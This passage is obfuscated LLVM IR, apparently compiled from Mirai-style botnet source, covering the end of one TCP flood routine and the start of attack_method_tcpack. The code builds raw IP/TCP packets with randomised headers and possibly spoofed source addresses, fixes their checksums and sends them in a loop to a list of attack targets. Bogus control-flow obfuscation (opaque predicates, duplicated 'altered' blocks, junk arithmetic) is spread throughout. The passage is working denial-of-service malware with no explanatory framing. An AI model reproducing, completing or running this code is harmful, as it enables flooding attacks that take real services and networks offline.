  %429 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %428, i32 0, i32 8
  store i32 %427, i32* %429, align 4
  %430 = load i32, i32* @x.25
  %431 = load i32, i32* @y.26
  %432 = sub i32 %430, 1
  %433 = mul i32 %430, %432
  %434 = urem i32 %433, 2
  %435 = icmp eq i32 %434, 0
  %436 = icmp slt i32 %431, 10
  %437 = or i1 %435, %436
  br i1 %437, label %originalBBpart257, label %originalBB55alteredBB

originalBBpart257:                                ; preds = %originalBB55
  br label %438

; <label>:438:                                    ; preds = %originalBBpart257, %415
  %439 = load i32, i32* @x.25
  %440 = load i32, i32* @y.26
  %441 = sub i32 %439, 1
  %442 = mul i32 %439, %441
  %443 = urem i32 %442, 2
  %444 = icmp eq i32 %443, 0
  %445 = icmp slt i32 %440, 10
  %446 = or i1 %444, %445
  br i1 %446, label %originalBB59, label %originalBB59alteredBB

originalBB59:                                     ; preds = %originalBB59alteredBB, %438
  %447 = load i16, i16* %13, align 2
  %448 = zext i16 %447 to i32
  %449 = icmp eq i32 %448, 65535
  %450 = load i32, i32* @x.25
  %451 = load i32, i32* @y.26
  %452 = sub i32 %450, 1
  %453 = mul i32 %450, %452
  %454 = urem i32 %453, 2
  %455 = icmp eq i32 %454, 0
  %456 = icmp slt i32 %451, 10
  %457 = or i1 %455, %456
  br i1 %457, label %originalBBpart261, label %originalBB59alteredBB

originalBBpart261:                                ; preds = %originalBB59
  br i1 %449, label %458, label %464

; <label>:458:                                    ; preds = %originalBBpart261
  %459 = call i32 @rand_next()
  %460 = and i32 %459, 65535
  %461 = trunc i32 %460 to i16
  %462 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %463 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %462, i32 0, i32 3
  store i16 %461, i16* %463, align 4
  br label %464

; <label>:464:                                    ; preds = %458, %originalBBpart261
  %465 = load i32, i32* @x.25
  %466 = load i32, i32* @y.26
  %467 = sub i32 %465, 1
  %468 = mul i32 %465, %467
  %469 = urem i32 %468, 2
  %470 = icmp eq i32 %469, 0
  %471 = icmp slt i32 %466, 10
  %472 = or i1 %470, %471
  br i1 %472, label %originalBB63, label %originalBB63alteredBB

originalBB63:                                     ; preds = %originalBB63alteredBB, %464
  %473 = load i16, i16* %16, align 2
  %474 = zext i16 %473 to i32
  %475 = icmp eq i32 %474, 65535
  %476 = load i32, i32* @x.25
  %477 = load i32, i32* @y.26
  %478 = sub i32 %476, 1
  %479 = mul i32 %476, %478
  %480 = urem i32 %479, 2
  %481 = icmp eq i32 %480, 0
  %482 = icmp slt i32 %477, 10
  %483 = or i1 %481, %482
  br i1 %483, label %originalBBpart265, label %originalBB63alteredBB

originalBBpart265:                                ; preds = %originalBB63
  br i1 %475, label %484, label %490

; <label>:484:                                    ; preds = %originalBBpart265
  %485 = call i32 @rand_next()
  %486 = and i32 %485, 65535
  %487 = trunc i32 %486 to i16
  %488 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %489 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %488, i32 0, i32 0
  store i16 %487, i16* %489, align 4
  br label %490

; <label>:490:                                    ; preds = %484, %originalBBpart265
  %491 = load i16, i16* %17, align 2
  %492 = zext i16 %491 to i32
  %493 = icmp eq i32 %492, 65535
  br i1 %493, label %494, label %500

; <label>:494:                                    ; preds = %490
  %495 = call i32 @rand_next()
  %496 = and i32 %495, 65535
  %497 = trunc i32 %496 to i16
  %498 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %499 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %498, i32 0, i32 1
  store i16 %497, i16* %499, align 2
  br label %500

; <label>:500:                                    ; preds = %494, %490
  %501 = load i32, i32* %18, align 4
  %502 = icmp eq i32 %501, 65535
  br i1 %502, label %503, label %523

; <label>:503:                                    ; preds = %500
  %504 = load i32, i32* @x.25
  %505 = load i32, i32* @y.26
  %506 = sub i32 %504, 1
  %507 = mul i32 %504, %506
  %508 = urem i32 %507, 2
  %509 = icmp eq i32 %508, 0
  %510 = icmp slt i32 %505, 10
  %511 = or i1 %509, %510
  br i1 %511, label %originalBB67, label %originalBB67alteredBB

originalBB67:                                     ; preds = %originalBB67alteredBB, %503
  %512 = call i32 @rand_next()
  %513 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %514 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %513, i32 0, i32 2
  store i32 %512, i32* %514, align 4
  %515 = load i32, i32* @x.25
  %516 = load i32, i32* @y.26
  %517 = sub i32 %515, 1
  %518 = mul i32 %515, %517
  %519 = urem i32 %518, 2
  %520 = icmp eq i32 %519, 0
  %521 = icmp slt i32 %516, 10
  %522 = or i1 %520, %521
  br i1 %522, label %originalBBpart269, label %originalBB67alteredBB

originalBBpart269:                                ; preds = %originalBB67
  br label %523

; <label>:523:                                    ; preds = %originalBBpart269, %500
  %524 = load i32, i32* %19, align 4
  %525 = icmp eq i32 %524, 65535
  br i1 %525, label %526, label %530

; <label>:526:                                    ; preds = %523
  %527 = call i32 @rand_next()
  %528 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %529 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %528, i32 0, i32 3
  store i32 %527, i32* %529, align 4
  br label %530

; <label>:530:                                    ; preds = %526, %523
  %531 = load i32, i32* @x.25
  %532 = load i32, i32* @y.26
  %533 = sub i32 %531, 1
  %534 = mul i32 %531, %533
  %535 = urem i32 %534, 2
  %536 = icmp eq i32 %535, 0
  %537 = icmp slt i32 %532, 10
  %538 = or i1 %536, %537
  br i1 %538, label %originalBB71, label %originalBB71alteredBB

originalBB71:                                     ; preds = %originalBB71alteredBB, %530
  %539 = load i8, i8* %20, align 1
  %540 = icmp ne i8 %539, 0
  %541 = load i32, i32* @x.25
  %542 = load i32, i32* @y.26
  %543 = sub i32 %541, 1
  %544 = mul i32 %541, %543
  %545 = urem i32 %544, 2
  %546 = icmp eq i32 %545, 0
  %547 = icmp slt i32 %542, 10
  %548 = or i1 %546, %547
  br i1 %548, label %originalBBpart273, label %originalBB71alteredBB

originalBBpart273:                                ; preds = %originalBB71
  br i1 %540, label %549, label %571

; <label>:549:                                    ; preds = %originalBBpart273
  %550 = load i32, i32* @x.25
  %551 = load i32, i32* @y.26
  %552 = sub i32 %550, 1
  %553 = mul i32 %550, %552
  %554 = urem i32 %553, 2
  %555 = icmp eq i32 %554, 0
  %556 = icmp slt i32 %551, 10
  %557 = or i1 %555, %556
  br i1 %557, label %originalBB75, label %originalBB75alteredBB

originalBB75:                                     ; preds = %originalBB75alteredBB, %549
  %558 = call i32 @rand_next()
  %559 = and i32 %558, 65535
  %560 = trunc i32 %559 to i16
  %561 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %562 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %561, i32 0, i32 7
  store i16 %560, i16* %562, align 2
  %563 = load i32, i32* @x.25
  %564 = load i32, i32* @y.26
  %565 = sub i32 %563, 1
  %566 = mul i32 %563, %565
  %567 = urem i32 %566, 2
  %568 = icmp eq i32 %567, 0
  %569 = icmp slt i32 %564, 10
  %570 = or i1 %568, %569
  br i1 %570, label %originalBBpart285, label %originalBB75alteredBB

originalBBpart285:                                ; preds = %originalBB75
  br label %571

; <label>:571:                                    ; preds = %originalBBpart285, %originalBBpart273
  %572 = load i32, i32* @x.25
  %573 = load i32, i32* @y.26
  %574 = sub i32 %572, 1
  %575 = mul i32 %572, %574
  %576 = urem i32 %575, 2
  %577 = icmp eq i32 %576, 0
  %578 = icmp slt i32 %573, 10
  %579 = or i1 %577, %578
  br i1 %579, label %originalBB87, label %originalBB87alteredBB

originalBB87:                                     ; preds = %originalBB87alteredBB, %571
  %580 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %581 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %580, i32 0, i32 7
  store i16 0, i16* %581, align 2
  %582 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %583 = bitcast %struct.iphdr* %582 to i16*
  %584 = call zeroext i16 @checksum_generic(i16* %583, i32 20)
  %585 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %586 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %585, i32 0, i32 7
  store i16 %584, i16* %586, align 2
  %587 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %588 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %587, i32 0, i32 6
  store i16 0, i16* %588, align 4
  %589 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %590 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %591 = bitcast %struct.tcphdr* %590 to i8*
  %592 = call zeroext i16 @htons(i16 zeroext 40) #7
  %593 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %589, i8* %591, i16 zeroext %592, i32 40)
  %594 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %595 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %594, i32 0, i32 6
  store i16 %593, i16* %595, align 4
  %596 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %597 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %596, i32 0, i32 1
  %598 = load i16, i16* %597, align 2
  %599 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %600 = load i32, i32* %9, align 4
  %601 = sext i32 %600 to i64
  %602 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %599, i64 %601
  %603 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %602, i32 0, i32 0
  %604 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %603, i32 0, i32 1
  store i16 %598, i16* %604, align 2
  %605 = load i32, i32* %10, align 4
  %606 = load i8*, i8** %30, align 8
  %607 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %608 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %609 = load i32, i32* %9, align 4
  %610 = sext i32 %609 to i64
  %611 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %608, i64 %610
  %612 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %611, i32 0, i32 0
  %613 = bitcast %struct.sockaddr_in* %612 to %struct.sockaddr*
  store %struct.sockaddr* %613, %struct.sockaddr** %607, align 8
  %614 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %615 = load %struct.sockaddr*, %struct.sockaddr** %614, align 8
  %616 = call i64 @sendto(i32 %605, i8* %606, i64 60, i32 16384, %struct.sockaddr* %615, i32 16)
  %617 = load i32, i32* @x.25
  %618 = load i32, i32* @y.26
  %619 = sub i32 %617, 1
  %620 = mul i32 %617, %619
  %621 = urem i32 %620, 2
  %622 = icmp eq i32 %621, 0
  %623 = icmp slt i32 %618, 10
  %624 = or i1 %622, %623
  br i1 %624, label %originalBBpart289, label %originalBB87alteredBB

originalBBpart289:                                ; preds = %originalBB87
  br label %625

; <label>:625:                                    ; preds = %originalBBpart289
  %626 = load i32, i32* %9, align 4
  %627 = add nsw i32 %626, 1
  store i32 %627, i32* %9, align 4
  br label %354

; <label>:628:                                    ; preds = %354
  br label %353

; <label>:629:                                    ; preds = %120, %98
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %99
  store i32 1, i32* %9, align 4
  %630 = load i32, i32* %10, align 4
  %631 = bitcast i32* %9 to i8*
  %632 = call i32 @setsockopt(i32 %630, i32 0, i32 3, i8* %631, i32 4) #6
  %633 = icmp eq i32 %632, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %123
  store i32 0, i32* %9, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %145
  %634 = call noalias i8* @calloc(i64 128, i64 1) #6
  %635 = load i8**, i8*** %11, align 8
  %636 = load i32, i32* %9, align 4
  %637 = sext i32 %636 to i64
  %638 = getelementptr inbounds i8*, i8** %635, i64 %637
  store i8* %634, i8** %638, align 8
  %639 = load i8**, i8*** %11, align 8
  %640 = load i32, i32* %9, align 4
  %641 = sext i32 %640 to i64
  %642 = getelementptr inbounds i8*, i8** %639, i64 %641
  %643 = load i8*, i8** %642, align 8
  %644 = bitcast i8* %643 to %struct.iphdr*
  store %struct.iphdr* %644, %struct.iphdr** %27, align 8
  %645 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %646 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %645, i64 1
  %647 = bitcast %struct.iphdr* %646 to %struct.tcphdr*
  store %struct.tcphdr* %647, %struct.tcphdr** %28, align 8
  %648 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %649 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %648, i64 1
  %650 = bitcast %struct.tcphdr* %649 to i8*
  store i8* %650, i8** %29, align 8
  %651 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %652 = bitcast %struct.iphdr* %651 to i8*
  %653 = load i8, i8* %652, align 4
  %_ = shl i8 %653, 15
  %_7 = shl i8 %653, 15
  %_8 = sub i8 0, %653
  %gen = add i8 %_8, 15
  %_9 = sub i8 0, %653
  %gen10 = add i8 %_9, 15
  %_11 = sub i8 %653, 15
  %gen12 = mul i8 %_11, 15
  %654 = and i8 %653, 15
  %_13 = sub i8 0, %654
  %gen14 = add i8 %_13, 64
  %_15 = sub i8 0, %654
  %gen16 = add i8 %_15, 64
  %_17 = sub i8 0, %654
  %gen18 = add i8 %_17, 64
  %655 = or i8 %654, 64
  store i8 %655, i8* %652, align 4
  %656 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %657 = bitcast %struct.iphdr* %656 to i8*
  %658 = load i8, i8* %657, align 4
  %_19 = shl i8 %658, -16
  %_20 = sub i8 %658, -16
  %gen21 = mul i8 %_20, -16
  %_22 = sub i8 0, %658
  %gen23 = add i8 %_22, -16
  %_24 = shl i8 %658, -16
  %_25 = shl i8 %658, -16
  %659 = and i8 %658, -16
  %_26 = sub i8 0, %659
  %gen27 = add i8 %_26, 5
  %660 = or i8 %659, 5
  store i8 %660, i8* %657, align 4
  %661 = load i8, i8* %12, align 1
  %662 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %663 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %662, i32 0, i32 1
  store i8 %661, i8* %663, align 1
  %664 = call zeroext i16 @htons(i16 zeroext 60) #7
  %665 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %666 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %665, i32 0, i32 2
  store i16 %664, i16* %666, align 2
  %667 = load i16, i16* %13, align 2
  %668 = call zeroext i16 @htons(i16 zeroext %667) #7
  %669 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %670 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %669, i32 0, i32 3
  store i16 %668, i16* %670, align 4
  %671 = load i8, i8* %14, align 1
  %672 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %673 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %672, i32 0, i32 5
  store i8 %671, i8* %673, align 4
  %674 = load i8, i8* %15, align 1
  %675 = icmp ne i8 %674, 0
  br label %originalBB6

originalBB31alteredBB:                            ; preds = %originalBB31, %336
  br label %originalBB31

originalBB35alteredBB:                            ; preds = %originalBB35, %378
  %676 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %677 = load i32, i32* %9, align 4
  %678 = sext i32 %677 to i64
  %679 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %676, i64 %678
  %680 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %679, i32 0, i32 1
  %681 = load i32, i32* %680, align 4
  %682 = call i32 @ntohl(i32 %681) #7
  %683 = call i32 @rand_next()
  %684 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %685 = load i32, i32* %9, align 4
  %686 = sext i32 %685 to i64
  %687 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %684, i64 %686
  %688 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %687, i32 0, i32 2
  %689 = load i8, i8* %688, align 4
  %690 = zext i8 %689 to i32
  %_36 = shl i32 %683, %690
  %_37 = sub i32 0, %683
  %gen38 = add i32 %_37, %690
  %_39 = shl i32 %683, %690
  %_40 = sub i32 0, %683
  %gen41 = add i32 %_40, %690
  %691 = lshr i32 %683, %690
  %_42 = sub i32 0, %682
  %gen43 = add i32 %_42, %691
  %_44 = sub i32 0, %682
  %gen45 = add i32 %_44, %691
  %_46 = sub i32 %682, %691
  %gen47 = mul i32 %_46, %691
  %_48 = sub i32 %682, %691
  %gen49 = mul i32 %_48, %691
  %_50 = sub i32 %682, %691
  %gen51 = mul i32 %_50, %691
  %692 = add i32 %682, %691
  %693 = call i32 @htonl(i32 %692) #7
  %694 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %695 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %694, i32 0, i32 9
  store i32 %693, i32* %695, align 4
  br label %originalBB35

originalBB55alteredBB:                            ; preds = %originalBB55, %418
  %696 = call i32 @rand_next()
  %697 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %698 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %697, i32 0, i32 8
  store i32 %696, i32* %698, align 4
  br label %originalBB55

originalBB59alteredBB:                            ; preds = %originalBB59, %438
  %699 = load i16, i16* %13, align 2
  %700 = zext i16 %699 to i32
  %701 = icmp eq i32 %700, 65535
  br label %originalBB59

originalBB63alteredBB:                            ; preds = %originalBB63, %464
  %702 = load i16, i16* %16, align 2
  %703 = zext i16 %702 to i32
  %704 = icmp eq i32 %703, 65535
  br label %originalBB63

originalBB67alteredBB:                            ; preds = %originalBB67, %503
  %705 = call i32 @rand_next()
  %706 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %707 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %706, i32 0, i32 2
  store i32 %705, i32* %707, align 4
  br label %originalBB67

originalBB71alteredBB:                            ; preds = %originalBB71, %530
  %708 = load i8, i8* %20, align 1
  %709 = icmp ne i8 %708, 0
  br label %originalBB71

originalBB75alteredBB:                            ; preds = %originalBB75, %549
  %710 = call i32 @rand_next()
  %_76 = shl i32 %710, 65535
  %_77 = sub i32 %710, 65535
  %gen78 = mul i32 %_77, 65535
  %_79 = shl i32 %710, 65535
  %_80 = sub i32 0, %710
  %gen81 = add i32 %_80, 65535
  %_82 = sub i32 %710, 65535
  %gen83 = mul i32 %_82, 65535
  %711 = and i32 %710, 65535
  %712 = trunc i32 %711 to i16
  %713 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %714 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %713, i32 0, i32 7
  store i16 %712, i16* %714, align 2
  br label %originalBB75

originalBB87alteredBB:                            ; preds = %originalBB87, %571
  %715 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %716 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %715, i32 0, i32 7
  store i16 0, i16* %716, align 2
  %717 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %718 = bitcast %struct.iphdr* %717 to i16*
  %719 = call zeroext i16 @checksum_generic(i16* %718, i32 20)
  %720 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %721 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %720, i32 0, i32 7
  store i16 %719, i16* %721, align 2
  %722 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %723 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %722, i32 0, i32 6
  store i16 0, i16* %723, align 4
  %724 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %725 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %726 = bitcast %struct.tcphdr* %725 to i8*
  %727 = call zeroext i16 @htons(i16 zeroext 40) #7
  %728 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %724, i8* %726, i16 zeroext %727, i32 40)
  %729 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %730 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %729, i32 0, i32 6
  store i16 %728, i16* %730, align 4
  %731 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %732 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %731, i32 0, i32 1
  %733 = load i16, i16* %732, align 2
  %734 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %735 = load i32, i32* %9, align 4
  %736 = sext i32 %735 to i64
  %737 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %734, i64 %736
  %738 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %737, i32 0, i32 0
  %739 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %738, i32 0, i32 1
  store i16 %733, i16* %739, align 2
  %740 = load i32, i32* %10, align 4
  %741 = load i8*, i8** %30, align 8
  %742 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %743 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %744 = load i32, i32* %9, align 4
  %745 = sext i32 %744 to i64
  %746 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %743, i64 %745
  %747 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %746, i32 0, i32 0
  %748 = bitcast %struct.sockaddr_in* %747 to %struct.sockaddr*
  store %struct.sockaddr* %748, %struct.sockaddr** %742, align 8
  %749 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %750 = load %struct.sockaddr*, %struct.sockaddr** %749, align 8
  %751 = call i64 @sendto(i32 %740, i8* %741, i64 60, i32 16384, %struct.sockaddr* %750, i32 16)
  br label %originalBB87
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpack(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = load i32, i32* @x.27
  %6 = load i32, i32* @y.28
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i8, align 1
  %14 = alloca %struct.attack_target*, align 8
  %15 = alloca i8, align 1
  %16 = alloca %struct.attack_option*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8**, align 8
  %20 = alloca i8, align 1
  %21 = alloca i16, align 2
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i16, align 2
  %25 = alloca i16, align 2
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8, align 1
  %29 = alloca i8, align 1
  %30 = alloca i8, align 1
  %31 = alloca i8, align 1
  %32 = alloca i8, align 1
  %33 = alloca i8, align 1
  %34 = alloca i32, align 4
  %35 = alloca i8, align 1
  %36 = alloca i32, align 4
  %37 = alloca %struct.iphdr*, align 8
  %38 = alloca %struct.tcphdr*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca i8*, align 8
  %41 = alloca %struct.iphdr*, align 8
  %42 = alloca %struct.tcphdr*, align 8
  %43 = alloca i8*, align 8
  %44 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %13, align 1
  store %struct.attack_target* %1, %struct.attack_target** %14, align 8
  store i8 %2, i8* %15, align 1
  store %struct.attack_option* %3, %struct.attack_option** %16, align 8
  %45 = load i8, i8* %13, align 1
  %46 = zext i8 %45 to i64
  %47 = call noalias i8* @calloc(i64 %46, i64 8) #6
  %48 = bitcast i8* %47 to i8**
  store i8** %48, i8*** %19, align 8
  %49 = load i8, i8* %15, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 2, i32 0)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %20, align 1
  %53 = load i8, i8* %15, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 3, i32 65535)
  %56 = trunc i32 %55 to i16
  store i16 %56, i16* %21, align 2
  %57 = load i8, i8* %15, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 4, i32 64)
  %60 = trunc i32 %59 to i8
  store i8 %60, i8* %22, align 1
  %61 = load i8, i8* %15, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 5, i32 0)
  %64 = trunc i32 %63 to i8
  store i8 %64, i8* %23, align 1
  %65 = load i8, i8* %15, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 6, i32 65535)
  %68 = trunc i32 %67 to i16
  store i16 %68, i16* %24, align 2
  %69 = load i8, i8* %15, align 1
  %70 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %71 = call i32 @attack_get_opt_int(i8 zeroext %69, %struct.attack_option* %70, i8 zeroext 7, i32 65535)
  %72 = trunc i32 %71 to i16
  store i16 %72, i16* %25, align 2
  %73 = load i8, i8* %15, align 1
  %74 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %75 = call i32 @attack_get_opt_int(i8 zeroext %73, %struct.attack_option* %74, i8 zeroext 17, i32 65535)
  store i32 %75, i32* %26, align 4
  %76 = load i8, i8* %15, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 18, i32 65535)
  store i32 %78, i32* %27, align 4
  %79 = load i8, i8* %15, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 11, i32 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %28, align 1
  %83 = load i8, i8* %15, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 12, i32 1)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %29, align 1
  %87 = load i8, i8* %15, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 13, i32 0)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %30, align 1
  %91 = load i8, i8* %15, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 14, i32 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %31, align 1
  %95 = load i8, i8* %15, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %97 = call i32 @attack_get_opt_int(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 15, i32 0)
  %98 = trunc i32 %97 to i8
  store i8 %98, i8* %32, align 1
  %99 = load i8, i8* %15, align 1
  %100 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %101 = call i32 @attack_get_opt_int(i8 zeroext %99, %struct.attack_option* %100, i8 zeroext 16, i32 0)
  %102 = trunc i32 %101 to i8
  store i8 %102, i8* %33, align 1
  %103 = load i8, i8* %15, align 1
  %104 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %105 = call i32 @attack_get_opt_int(i8 zeroext %103, %struct.attack_option* %104, i8 zeroext 0, i32 512)
  store i32 %105, i32* %34, align 4
  %106 = load i8, i8* %15, align 1
  %107 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %108 = call i32 @attack_get_opt_int(i8 zeroext %106, %struct.attack_option* %107, i8 zeroext 1, i32 1)
  %109 = trunc i32 %108 to i8
  store i8 %109, i8* %35, align 1
  %110 = load i8, i8* %15, align 1
  %111 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %112 = load i32, i32* @LOCAL_ADDR, align 4
  %113 = call i32 @attack_get_opt_ip(i8 zeroext %110, %struct.attack_option* %111, i8 zeroext 25, i32 %112)
  store i32 %113, i32* %36, align 4
  %114 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %114, i32* %18, align 4
  %115 = icmp eq i32 %114, -1
  %116 = load i32, i32* @x.27
  %117 = load i32, i32* @y.28
  %118 = sub i32 %116, 1
  %119 = mul i32 %116, %118
  %120 = urem i32 %119, 2
  %121 = icmp eq i32 %120, 0
  %122 = icmp slt i32 %117, 10
  %123 = or i1 %121, %122
  br i1 %123, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %115, label %124, label %141

; <label>:124:                                    ; preds = %originalBBpart2
  %125 = load i32, i32* @x.27
  %126 = load i32, i32* @y.28
  %127 = sub i32 %125, 1
  %128 = mul i32 %125, %127
  %129 = urem i32 %128, 2
  %130 = icmp eq i32 %129, 0
  %131 = icmp slt i32 %126, 10
  %132 = or i1 %130, %131
  br i1 %132, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %124
  %133 = load i32, i32* @x.27
  %134 = load i32, i32* @y.28
  %135 = sub i32 %133, 1
  %136 = mul i32 %133, %135
  %137 = urem i32 %136, 2
  %138 = icmp eq i32 %137, 0
  %139 = icmp slt i32 %134, 10
